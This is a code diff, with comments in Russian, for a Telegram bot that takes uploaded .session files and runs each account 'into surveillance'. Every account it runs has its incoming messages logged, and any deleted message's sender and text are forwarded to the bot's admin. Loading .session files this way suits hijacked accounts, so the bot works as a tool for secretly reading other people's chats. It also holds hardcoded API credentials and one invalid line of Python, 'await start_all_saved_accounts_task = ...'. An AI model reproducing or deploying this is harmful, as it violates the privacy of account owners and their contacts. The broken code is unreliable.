@@ -1,11 +1,11 @@
 import asyncio
 import logging
 import sqlite3
+import os
+import glob
 from telethon import TelegramClient, events, Button
-from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError
 
-# Импортируем мини веб-сервер для обхода ограничений Render
+# Импортируем веб-сервер для Render
 from fastapi import FastAPI
 import uvicorn
 
@@ -15,28 +15,25 @@ ADMIN_ID = 8669477816
 API_ID = 39188918
 API_HASH = "41aaeaa0c6f9a61c0504395ccf5f3b3c"
 
-# --- НАСТРОЙКА БАЗЫ ДАННЫХ SQLITE ---
+# --- НАСТРОЙКА БАЗЫ ДАННЫХ SQLITE (ДЛЯ КЭША СООБЩЕНИЙ) ---
 logging.basicConfig(level=logging.INFO)
 db = sqlite3.connect("bot_data.db", check_same_thread=False)
 cursor = db.cursor()
-cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (phone TEXT PRIMARY KEY, session_str TEXT)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS messages (acc_phone TEXT, msg_id INTEGER, chat_id INTEGER, sender_name TEXT, text TEXT, PRIMARY KEY (acc_phone, msg_id, chat_id))''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS messages (acc_name TEXT, msg_id INTEGER, chat_id INTEGER, sender_name TEXT, text TEXT, PRIMARY KEY (acc_name, msg_id, chat_id))''')
 db.commit()
 
 bot = TelegramClient('main_bot_session', API_ID, API_HASH)
-user_steps = {}  
 active_clients = {}  
 
-# --- СОЗДАЕМ ВЕБ-ЗАГЛУШКУ ДЛЯ RENDER ---
+# --- ВЕБ-ЗАГЛУШКА ДЛЯ RENDER ---
 app = FastAPI()
 
 @app.get("/")
 def read_root():
-    # На эту ссылку можно вешать твой пингер против спячки (например, cron-job.org)
-    return {"status": "ok", "message": "Бот-логер запущен и работает без спячки!"}
+    return {"status": "ok", "message": f"Бот-логер работает! Активных сессий: {len(active_clients)}"}
 
-# --- ЛОГИКА ТЕЛЕГРАМА (СБОР СООБЩЕНИЙ И УДАЛЕНИЯ) ---
-def register_userbot_handlers(client, phone):
+# --- ЛОГИКА ПЕРЕХВАТА И УДАЛЕНИЯ СООБЩЕНИЙ ---
+def register_userbot_handlers(client, acc_name):
     @client.on(events.NewMessage(incoming=True))
     async def on_new_message(event):
         if not (event.is_private or event.is_group):
@@ -47,13 +44,13 @@ def register_userbot_handlers(client, phone):
         sender_name = f"@{sender.username}" if sender and getattr(sender, 'username', None) else f"{getattr(sender, 'first_name', '')} {getattr(sender, 'last_name', '')}".strip()
         if not sender_name:
             sender_name = f"ID: {event.sender_id}"
-        cursor.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?, ?, ?)", (phone, event.id, event.chat_id, sender_name, event.text))
+        cursor.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?, ?, ?)", (acc_name, event.id, event.chat_id, sender_name, event.text))
         db.commit()
 
     @client.on(events.MessageDeleted())
     async def on_message_deleted(event):
         for msg_id in event.deleted_ids:
-            cursor.execute("SELECT sender_name, text FROM messages WHERE acc_phone = ? AND msg_id = ?", (phone, msg_id))
+            cursor.execute("SELECT sender_name, text FROM messages WHERE acc_name = ? AND msg_id = ?", (acc_name, msg_id))
             res = cursor.fetchone()
             if res:
                 sender_name, text = res
@@ -65,148 +62,116 @@ def register_userbot_handlers(client, phone):
 
                 report = (
                     f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ!</b>\n\n"
-                    f"📱 <b>Лог аккаунта:</b> {phone}\n"
+                    f"📱 <b>Лог аккаунта:</b> {acc_name}\n"
                     f"👥 <b>Где:</b> {chat_title}\n"
                     f"👤 <b>От кого:</b> {sender_name}\n"
                     f"📝 <b>Текст:</b> {text}"
                 )
                 await bot.send_message(ADMIN_ID, report, parse_mode='html')
-                cursor.execute("DELETE FROM messages WHERE acc_phone = ? AND msg_id = ?", (phone, msg_id))
+                cursor.execute("DELETE FROM messages WHERE acc_name = ? AND msg_id = ?", (acc_name, msg_id))
                 db.commit()
 
-async def start_all_saved_accounts():
-    cursor.execute("SELECT phone, session_str FROM sessions")
-    rows = cursor.fetchall()
-    for phone, session_str in rows:
+async def start_all_session_files():
+    """Запуск всех файлов .session, которые есть в папке"""
+    session_files = glob.glob("*.session")
+    for file_path in session_files:
+        session_name = os.path.basename(file_path).replace(".session", "")
+        if session_name == "main_bot_session" or session_name in active_clients:
+            continue
+            
         try:
-            cl = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+            cl = TelegramClient(session_name, API_ID, API_HASH)
             await cl.connect()
             if await cl.is_user_authorized():
-                active_clients[phone] = cl
-                register_userbot_handlers(cl, phone)
-                logging.info(f"Аккаунт {phone} успешно подключен к слежке.")
+                active_clients[session_name] = cl
+                register_userbot_handlers(cl, session_name)
+                logging.info(f"💾 Файл сессии {session_name}.session запущен!")
             else:
-                logging.warning(f"Сессия {phone} недействительна.")
+                logging.warning(f"❌ Файл сессии {session_name}.session не авторизован.")
         except Exception as e:
-            logging.error(f"Не удалось запустить аккаунт {phone}: {e}")
+            logging.error(f"⚠️ Ошибка запуска {session_name}.session: {e}")
 
-# --- ИНТЕРФЕЙС И КНОПКИ ---
+# --- ИНТЕРФЕЙС УПРАВЛЕНИЯ БОТОМ ---
+
 @bot.on(events.NewMessage(pattern='/start', from_users=ADMIN_ID))
 async def send_welcome(event):
     buttons = [
-        [Button.inline("➕ Добавить аккаунт", b"add_acc")],
-        [Button.inline("📱 Мои аккаунты", b"list_acc")]
+        [Button.inline("📱 Список сессий", b"list_sessions")]
     ]
-    await event.respond("👋 Привет! Я твой новый менеджер аккаунтов-логов.\n\nЖми кнопки ниже:", buttons=buttons)
+    await event.respond("👋 Привет! Я твой логер через загрузку <b>.session</b> файлов.\n\n"
+                        "📂 <b>Как добавить аккаунт?</b>\n"
+                        "Просто отправь мне файл сессии (документом) прямо в этот чат!\n"
+                        "Я сам скачаю его и мгновенно запущу в слежку.", buttons=buttons, parse_mode='html')
 
 @bot.on(events.CallbackQuery())
 async def callback_handler(event):
     if event.sender_id != ADMIN_ID:
         return
-    data = event.data
-    if data == b"add_acc":
-        # ИСПРАВЛЕНИЕ: Полное принудительное обнуление сессий перед входом во второй аккаунт
-        if ADMIN_ID in user_steps:
+    if event.data == b"list_sessions":
+        active_list = "\n".join([f"• <code>{name}.session</code>" for name in active_clients.keys()]) if active_clients else "Нет активных файлов сессий."
+        await event.respond(f"🟩 <b>Сейчас работают сессии:</b>\n\n{active_list}", parse_mode='html')
+
+# --- ПРИЕМ ФАЙЛОВ .SESSION ИЗ ЧАТА ---
+@bot.on(events.NewMessage(from_users=ADMIN_ID))
+async def handle_document(event):
+    # Проверяем, что нам прислали именно файл
+    if not event.document:
+        return
+        
+    file_name = event.document.attributes[0].file_name
+    
+    # Проверяем, что расширение файла именно .session
+    if not file_name.endswith(".session"):
+        await event.respond("❌ Мне нужны только файлы с расширением <code>.session</code>!", parse_mode='html')
+        return
+
+    # Защита от перезаписи главной сессии бота
+    if file_name == "main_bot_session.session":
+        await event.respond("❌ Файл не должен называться <code>main_bot_session.session</code>!", parse_mode='html')
+        return
+
+    status_msg = await event.respond(f"⏳ Скачиваю файл <code>{file_name}</code>...", parse_mode='html')
+    
+    try:
+        # Скачиваем файл сессии на сервер
+        path = await event.download_media(file=file_name)
+        session_name = file_name.replace(".session", "")
+        
+        # Если такой аккаунт уже был запущен, отключаем его старую копию
+        if session_name in active_clients:
             try:
-                old_cl = user_steps[ADMIN_ID].get("client")
-                if old_cl:
-                    await old_cl.disconnect()
+                await active_clients[session_name].disconnect()
             except:
                 pass
-            user_steps.pop(ADMIN_ID, None)
-            
-        user_steps[ADMIN_ID] = {"step": "phone"}
-        await event.respond("📱 Введи номер телефона в формате `+79991234567`:")
-    elif data == b"list_acc":
-        cursor.execute("SELECT phone FROM sessions")
-        accounts = cursor.fetchall()
-        if not accounts:
-            await event.respond("Список аккаунтов пуст.")
-        else:
-            text = "🟩 <b>Подключенные аккаунты:</b>\n\n" + "\n".join([f"• <code>{acc[0]}</code>" for acc in accounts])
-            await event.respond(text, parse_mode='html')
-
-@bot.on(events.NewMessage(from_users=ADMIN_ID))
-async def process_auth(event):
-    if ADMIN_ID not in user_steps:
-        return
-    state = user_steps[ADMIN_ID]
-    step = state.get("step")
-    
-    if step == "phone":
-        phone = event.text.strip().replace(" ", "")
-        state["phone"] = phone
-        cl = TelegramClient(StringSession(), API_ID, API_HASH)
+        
+        # Сразу пробуем запустить новый файл
+        cl = TelegramClient(session_name, API_ID, API_HASH)
         await cl.connect()
-        state["client"] = cl
-        try:
-            send_code_res = await cl.send_code_request(phone)
-            state["phone_code_hash"] = send_code_res.phone_code_hash
-            state["step"] = "code"
-            await event.respond("📩 Отправил код в Телеграм этого аккаунта. Введи его сюда:")
-        except Exception as e:
-            await event.respond(f"❌ Ошибка кода: {e}\nНачни заново через /start")
-            user_steps.pop(ADMIN_ID, None)
+        
+        if await cl.is_user_authorized():
+            active_clients[session_name] = cl
+            register_userbot_handlers(cl, session_name)
+            await status_msg.edit(f"✅ <b>Файл {file_name} успешно принят и запущен в слежку!</b>", parse_mode='html')
+        else:
+            await status_msg.edit(f"❌ Ошибка: файл сессии <code>{file_name}</code> не авторизован или устарел.", parse_mode='html')
+            if os.path.exists(path):
+                os.remove(path)
+                
+    except Exception as e:
+        await status_msg.edit(f"⚠️ Произошла ошибка при обработке файла: {e}")
 
-    elif step == "code":
-        code = event.text.strip()
-        cl = state["client"]
-        phone = state["phone"]
-        phone_code_hash = state["phone_code_hash"]
-        try:
-            await event.delete()
-        except:
-            pass
-        try:
-            await cl.sign_in(phone, code, phone_code_hash=phone_code_hash)
-            await save_and_start_session(event, cl, phone)
-        except SessionPasswordNeededError:
-            state["step"] = "password"
-            await event.respond("🔐 Введи двухфакторный пароль (2FA):")
-        except Exception as e:
-            await event.respond(f"❌ Ошибка кода: {e}\nСброс через /start")
-            user_steps.pop(ADMIN_ID, None)
-
-    elif step == "password":
-        password = event.text.strip()
-        cl = state["client"]
-        phone = state["phone"]
-        try:
-            await event.delete()
-        except:
-            pass
-        try:
-            await cl.sign_in(password=password)
-            await save_and_start_session(event, cl, phone)
-        except Exception as e:
-            await event.respond(f"❌ Неверный пароль: {e}\nСброс через /start")
-            user_steps.pop(ADMIN_ID, None)
-
-async def save_and_start_session(event, cl, phone):
-    session_str = cl.session.save()
-    cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?)", (phone, session_str))
-    db.commit()
-    active_clients[phone] = cl
-    register_userbot_handlers(cl, phone)
-    await event.respond(f"✅ <b>Аккаунт {phone} успешно запущен в слежку!</b>", parse_mode='html')
-    user_steps.pop(ADMIN_ID, None)
-
-# --- ЗАПУСК ДВУХ ПРОЦЕССОВ ОДНОВРЕМЕННО ---
 async def start_tg_bot():
     await bot.start(bot_token=BOT_TOKEN)
-    await start_all_saved_accounts()
-    print("🤖 Телеграм-бот на новом токене запущен!")
+    await start_all_saved_accounts_task = asyncio.create_task(start_all_session_files())
+    print("🤖 Системный бот запущен!")
     await bot.run_until_disconnected()
 
 async def main():
-    # Запускаем бота фоном, чтобы он не блокировал порт
     asyncio.create_task(start_tg_bot())
-    
-    # Поднимаем веб-сервер на порту 10000 для Render
     config = uvicorn.Config(app, host="0.0.0.0", port=10000, log_level="info")
     server = uvicorn.Server(config)
     await server.serve()
 
 if __name__ == '__main__':
     asyncio.run(main())
-    
+                       
